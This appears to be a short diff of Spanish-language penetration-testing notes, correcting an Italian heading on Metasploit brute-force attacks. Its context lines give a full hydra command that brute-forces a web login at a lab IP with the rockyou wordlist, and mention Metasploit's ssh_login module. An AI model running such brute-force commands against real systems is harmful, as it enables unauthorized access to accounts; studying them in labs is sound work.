@@ -210,7 +210,7 @@ El comando completo sería entonces:
 
 `sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.8 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password." -t 64`  
 
-# Attacchi di forza bruta con Metasploit  
+# Ataques de fuerza bruta con Metasploit  
 Puedo realizar ataques de fuerza bruta a SSH o FTP también con Metasploit.  
 Una vez lanzado Metasploit, puedo escribir `search ssh_login`.  
 
